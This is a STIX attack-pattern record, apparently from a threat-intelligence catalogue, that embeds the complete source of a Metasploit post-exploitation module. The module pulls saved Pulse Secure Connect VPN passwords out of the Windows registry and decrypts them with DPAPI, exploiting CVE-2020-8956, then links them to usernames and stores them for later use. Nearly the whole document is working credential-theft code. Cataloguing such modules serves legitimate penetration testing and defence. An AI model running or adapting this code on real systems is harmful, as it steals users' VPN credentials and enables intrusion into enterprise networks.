{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--68a0f446-d52f-4b14-9360-ba94f5b1f849",
    "created": "2024-08-14T16:33:11.441757Z",
    "modified": "2024-08-14T16:33:11.441761Z",
    "name": "Windows Pulse Secure Connect Client Saved Password Extractor",
    "description": " This module extracts and decrypts saved Pulse Secure Connect Client passwords from the Windows Registry. This module can only access credentials created by the user that the Meterpreter session is running as. Note that this module cannot link the password to a username unless the Meterpreter sessions is running as SYSTEM. This is because the username associated with a password is saved in 'C:\\ProgramData\\Pulse Secure\\ConnectionStore\\[SID].dat' which is only readable by SYSTEM. Note that for enterprise deployment, this username is almost always the domain username.  'License' => MSF_LICENSE 'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/pulse_secure.rb",
            "external_id": "pulse_secure.rb"
        },
        {
            "source_name": "reference",
            "url": "https://qkaiser.github.io/reversing/2020/10/27/pule-secure-credentials"
        },
        {
            "source_name": "reference",
            "url": "https://www.gremwell.com/blog/reversing_pulse_secure_client_credentials_store"
        },
        {
            "source_name": "reference",
            "url": "https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44601"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n\n  include Msf::Post::Windows::Registry\n  include Msf::Post::Windows::UserProfiles\n  include Msf::Post::Windows::Priv\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Pulse Secure Connect Client Saved Password Extractor',\n        'Description' => %q{\n          This module extracts and decrypts saved Pulse Secure Connect Client passwords from the\n          Windows Registry. This module can only access credentials created by the user that the\n          Meterpreter session is running as.\n          Note that this module cannot link the password to a username unless the\n          Meterpreter sessions is running as SYSTEM. This is because the username associated\n          with a password is saved in 'C:\\ProgramData\\Pulse Secure\\ConnectionStore\\[SID].dat',\n          which is only readable by SYSTEM.\n          Note that for enterprise deployment, this username is almost always the domain\n          username.\n        },\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'CVE', '2020-8956'],\n          [ 'URL', 'https://qkaiser.github.io/reversing/2020/10/27/pule-secure-credentials'],\n          [ 'URL', 'https://www.gremwell.com/blog/reversing_pulse_secure_client_credentials_store'],\n          [ 'URL', 'https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44601' ]\n        ],\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'Author' => ['Quentin Kaiser <kaiserquentin[at]gmail.com>'],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_stat\n              stdapi_railgun_api\n              stdapi_sys_config_getsid\n              stdapi_sys_process_attach\n              stdapi_sys_process_get_processes\n              stdapi_sys_process_getpid\n              stdapi_sys_process_memory_allocate\n              stdapi_sys_process_memory_read\n              stdapi_sys_process_memory_write\n            ]\n          }\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [IOC_IN_LOGS],\n          'Reliability' => []\n        }\n      )\n    )\n  end\n\n  # Decrypts `data` encrypted with Windows DPAPI by calling CryptUnprotectData\n  # with `entropy` as pOptionalEntropy value.\n  #\n  # @param [String] data Encrypted data, pDataIn per crypt32.dll.\n  # @param [String] entropy Optional entropy value, pOptionalEntropy per crypt32.dll\n  #\n  # @return [String] Decrypted value or empty string in case of failure.\n  #\n  def decrypt_reg(data, entropy)\n    begin\n      pid = session.sys.process.getpid\n      process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)\n\n      # write entropy to memory\n      emem = process.memory.allocate(128)\n      process.memory.write(emem, entropy)\n      # write encrypted data to memory\n      mem = process.memory.allocate(128)\n      process.memory.write(mem, data)\n\n      #  enumerate all processes to find the one that we're are currently executing as,\n      #  and then fetch the architecture attribute of that process by doing [\"arch\"]\n      #  to check if it is an 32bits process or not.\n      if session.sys.process.each_process.find { |i| i['pid'] == pid } ['arch'] == 'x86'\n        addr = [mem].pack('V')\n        len = [data.length].pack('V')\n\n        eaddr = [emem].pack('V')\n        elen = [entropy.length].pack('V')\n\n        ret = session.railgun.crypt32.CryptUnprotectData(\"#{len}#{addr}\", 16, \"#{elen}#{eaddr}\", nil, nil, 0, 8)\n        len, addr = ret['pDataOut'].unpack('V2')\n      else\n        # Convert using rex, basically doing: [mem & 0xffffffff, mem >> 32].pack(\"VV\")\n        addr = Rex::Text.pack_int64le(mem)\n        len = Rex::Text.pack_int64le(data.length)\n\n        eaddr = Rex::Text.pack_int64le(emem)\n        elen = Rex::Text.pack_int64le(entropy.length)\n\n        ret = session.railgun.crypt32.CryptUnprotectData(\"#{len}#{addr}\", 16, \"#{elen}#{eaddr}\", nil, nil, 0, 16)\n        p_data = ret['pDataOut'].unpack('VVVV')\n        len = p_data[0] + (p_data[1] << 32)\n        addr = p_data[2] + (p_data[3] << 32)\n      end\n      return '' if len == 0\n\n      return process.memory.read(addr, len)\n    rescue Rex::Post::Meterpreter::RequestError => e\n      vprint_error(e.message)\n    end\n    return ''\n  end\n\n  # Parse IVEs definitions from Pulse Secure Connect client connection store\n  # files. Each definition is converted into a Ruby hash holding a connection source,\n  # a friendly name, a URI, and an array of credentials. These Ruby hashes are stored\n  # into another Ruby hash, indexed by IVE identifiers.\n  #\n  # @return [hash] A Ruby hash indexed by IVE identifier\n  #\n  def find_ives\n    connstore_paths = [\n      'C:\\\\ProgramData\\\\Pulse Secure\\\\ConnectionStore\\\\connstore.dat',\n      'C:\\\\ProgramData\\\\Pulse Secure\\\\ConnectionStore\\\\connstore.bak',\n      'C:\\\\ProgramData\\\\Pulse Secure\\\\ConnectionStore\\\\connstore.tmp'\n    ]\n    begin\n      ives = {}\n      connstore_paths.each do |path|\n        next unless session.fs.file.exist?(path)\n\n        connstore_file = begin\n          session.fs.file.open(path)\n        rescue StandardError\n          nil\n        end\n        next if connstore_file.nil?\n\n        connstore_data = connstore_file.read.to_s\n        connstore_file.close\n        matches = connstore_data.scan(/ive \"([a-z0-9]*)\" {.*?connection-source: \"([^\"]*)\".*?friendly-name: \"([^\"]*)\".*?uri: \"([^\"]*)\".*?}/m)\n        matches.each do |m|\n          ives[m[0]] = {}\n          ives[m[0]]['connection-source'] = m[1]\n          ives[m[0]]['friendly-name'] = m[2]\n          ives[m[0]]['uri'] = m[3]\n          ives[m[0]]['creds'] = []\n        end\n      end\n      return ives\n    rescue Rex::Post::Meterpreter::RequestError => e\n      vprint_error(e.message)\n    end\n  end\n\n  # Pulse Secure Connect client service creates two files for each user that\n  # established a VPN connection at some point in time. The filename contains\n  # the user SID, with '.dat' or '.bak' as suffix.\n  #\n  # These files are only readable by SYSTEM and contains connection details\n  # for each IVE the user connected with. We use these details to extract\n  # the actual username used to establish the VPN connection if the module\n  # was run as the SYSTEM user.\n  #\n  # @return [String, nil] the username used by user linked to `sid` when establishing\n  # a connection with IVE `ive_index`, nil if none.\n  #\n  def get_username(sid, ive_index)\n    paths = [\n      \"C:\\\\ProgramData\\\\Pulse Secure\\\\ConnectionStore\\\\#{sid}.dat\",\n      \"C:\\\\ProgramData\\\\Pulse Secure\\\\ConnectionStore\\\\#{sid}.bak\",\n      \"C:\\\\ProgramData\\\\Pulse Secure\\\\ConnectionStore\\\\#{sid}.tmp\",\n    ]\n    begin\n      return unless is_system?\n\n      paths.each do |path|\n        next unless session.fs.file.exist?(path)\n\n        connstore_file = begin\n          session.fs.file.open(path)\n        rescue StandardError\n          nil\n        end\n        next if connstore_file.nil?\n\n        connstore_data = connstore_file.read.to_s\n        connstore_file.close\n\n        matches = connstore_data.scan(/userdata \"([a-z0-9]*)\" {.*?username: \"([^\"]*)\".*?}/m)\n        matches.each do |m|\n          if m[0] == ive_index\n            return m[1]\n          end\n        end\n      end\n    rescue Rex::Post::Meterpreter::RequestError => e\n      vprint_error(e.message)\n    end\n    return nil\n  end\n\n  # Implements IVE index to pOptionalEntropy value like Pulse Secure Connect\n  # client does.\n  #\n  # @return [String] pOptionalEntropy representation of `ive_index`.\n  #\n  def get_entropy_from_ive_index(ive_index)\n    return \"IVE:#{ive_index.upcase}\"\n  end\n\n  def find_creds\n    begin\n      # If we execute with elevated privileges, we can go through all registry values\n      # so we load all profiles. If we run without privileges, we just load our current\n      # user profile. We have to do that otherwise we try to access registry values that\n      # we are not allwoed to, triggering a 'Profile doesn't exist or cannot be accessed'\n      # error.\n      if is_system?\n        profiles = grab_user_profiles\n      else\n        profiles = [{ 'SID' => session.sys.config.getsid }]\n      end\n      creds = []\n      # we get connection ives\n      ives = find_ives\n      # for each user profile, we check for potential connection ive\n      profiles.each do |profile|\n        key_names = registry_enumkeys(\"HKEY_USERS\\\\#{profile['SID']}\\\\Software\\\\Pulse Secure\\\\Pulse\\\\User Data\")\n        next unless key_names\n\n        key_names.each do |key_name|\n          ive_index = key_name[4..] # remove 'ive:'\n          # We get the encrypted password value from registry\n          reg_path = \"HKEY_USERS\\\\#{profile['SID']}\\\\Software\\\\Pulse Secure\\\\Pulse\\\\User Data\\\\ive:#{ive_index}\"\n          vals = registry_enumvals(reg_path)\n\n          next unless vals\n\n          vals.each do |val|\n            data = registry_getvaldata(reg_path, val)\n            if is_system? && data.starts_with?(\"{\\x00c\\x00a\\x00p\\x00i\\x00}\\x00 \\x001\\x00,\")\n              # this means data was encrypted by elevated user using LocalSystem scope and fixed\n              # pOptionalEntropy value, adjusting parameters\n              data = [Rex::Text.to_ascii(data[18..-3])].pack('H*')\n              entropy = ['7B4C6492B77164BF81AB80EF044F01CE'].pack('H*')\n            else\n              # convert IVE index to DPAPI pOptionalEntropy value like PSC does\n              entropy = get_entropy_from_ive_index(ive_index).encode('UTF-16LE').bytes.pack('c*')\n            end\n\n            if !data.starts_with?(\"\\x01\\x00\\x00\\x00\\xD0\\x8C\\x9D\\xDF\\x01\\x15\\xD1\\x11\\x8Cz\\x00\\xC0O\\xC2\\x97\\xEB\")\n              next\n            end\n\n            decrypted = decrypt_reg(data, entropy)\n            next unless decrypted != ''\n\n            if !ives.key?(ive_index)\n              # If the ive_index is not in gathered IVEs, this means it's a leftover from\n              # previously installed Pulse Secure Connect client versions.\n              #\n              # IVE keys of existing connections can get removed from connstore.dat and connstore.tmp\n              # when the new version is executed and that the client has more than one defined connection,\n              # leading to them not being inserted in the 'ives' array.\n              #\n              # However, the registry values are not wiped when Pulse Secure Connect is upgraded\n              # to a new version (including versions that fix CVE-2020-8956).\n              #\n              # TL;DR; We can still decrypt the password, but we're missing the URI and friendly\n              # name of that connection.\n              ives[ive_index] = {}\n              ives[ive_index]['connection-source'] = 'user'\n              ives[ive_index]['friendly-name'] = 'unknown'\n              ives[ive_index]['uri'] = 'unknown'\n              ives[ive_index]['creds'] = []\n            end\n            ives[ive_index]['creds'].append(\n              {\n                'username' => get_username(profile['SID'], ive_index),\n                'password' => decrypted.remove(\"\\x00\")\n              }\n            )\n            creds << ives[ive_index]\n          end\n        end\n      end\n      return creds\n    rescue Rex::Post::Meterpreter::RequestError => e\n      vprint_error(e.message)\n    end\n    return []\n  end\n\n  def gather_creds\n    print_status('Running credentials acquisition.')\n    ives = find_creds\n    if ives.empty?\n      print_status('No credentials were found.')\n    end\n    return unless ives.any?\n\n    ives.each do |ive|\n      ive['creds'].each do |creds|\n        print_good('Account found')\n        print_status(\"     Username: #{creds['username']}\")\n        print_status(\"     Password: #{creds['password']}\")\n        print_status(\"     URI: #{ive['uri']}\")\n        print_status(\"     Name: #{ive['friendly-name']}\")\n        print_status(\"     Source: #{ive['connection-source']}\")\n\n        uri = URI(ive['uri'])\n        begin\n          address = Rex::Socket.getaddress(uri.host)\n        rescue SocketError\n          # if we can't resolve the host, we don't save it to service data\n          # in order not to fill it with blank entries\n          next\n        end\n        service_data = {\n          address: address,\n          port: uri.port,\n          protocol: 'tcp',\n          realm_key: Metasploit::Model::Realm::Key::WILDCARD,\n          realm_value: uri.path.blank? ? '/' : uri.path,\n          service_name: 'Pulse Secure SSL VPN',\n          workspace_id: myworkspace_id\n        }\n\n        credential_data = {\n          origin_type: :session,\n          session_id: session_db_id,\n          post_reference_name: refname,\n          username: creds['username'],\n          private_data: creds['password'],\n          private_type: :password\n        }\n\n        credential_core = create_credential(credential_data.merge(service_data))\n\n        login_data = {\n          core: credential_core,\n          access_level: 'User',\n          status: Metasploit::Model::Login::Status::UNTRIED\n        }\n\n        create_credential_login(login_data.merge(service_data))\n      end\n    end\n  end\n\n  # Array of vulnerable builds branches.\n  def vuln_builds\n    [\n      [Rex::Version.new('0.0.0'), Rex::Version.new('9.0.5')],\n      [Rex::Version.new('9.1.0'), Rex::Version.new('9.1.4')],\n    ]\n  end\n\n  # Check vulnerable state by parsing the build information from\n  # Pulse Connect Secure client version file.\n  #\n  # @return [Msf::Exploit::CheckCode] host vulnerable state\n  #\n  def check\n    version_path = 'C:\\\\Program Files (x86)\\\\Pulse Secure\\\\Pulse\\\\versionInfo.ini'\n    begin\n      if !session.fs.file.exist?(version_path)\n        print_error('Pulse Secure Connect client is not installed on this system')\n        return Msf::Exploit::CheckCode::Safe\n      end\n      version_file = begin\n        session.fs.file.open(version_path)\n      rescue StandardError\n        nil\n      end\n      if version_file.nil?\n        print_error('Cannot open Pulse Secure Connect version file.')\n        return Msf::Exploit::CheckCode::Unknown\n      end\n      version_data = version_file.read.to_s\n      version_file.close\n      matches = version_data.scan(/DisplayVersion=([0-9.]+)/m)\n      build = Rex::Version.new(matches[0][0])\n      print_status(\"Target is running Pulse Secure Connect build #{build}.\")\n      if vuln_builds.any? { |build_range| Rex::Version.new(build).between?(*build_range) }\n        print_good('This version is considered vulnerable.')\n        return Msf::Exploit::CheckCode::Vulnerable\n      end\n\n      if is_system?\n        print_good(\"You're executing from a privileged process so this version is considered vulnerable.\")\n        return Msf::Exploit::CheckCode::Vulnerable\n      end\n\n      print_warning(\"You're executing from an unprivileged process so this version is considered safe.\")\n      print_warning('However, there might be leftovers from previous versions in the registry.')\n      print_warning('We recommend running this script in elevated mode to obtain credentials saved by recent versions.')\n      return Msf::Exploit::CheckCode::Appears\n    rescue Rex::Post::Meterpreter::RequestError => e\n      vprint_error(e.message)\n    end\n  end\n\n  def run\n    check_code = check\n    if check_code == Msf::Exploit::CheckCode::Vulnerable || check_code == Msf::Exploit::CheckCode::Appears\n      gather_creds\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        "[Quentin Kaiser <kaiserquentin[at]gmail.com>]",
        ""
    ],
    "x_mitre_platforms": [
        "['win']"
    ]
}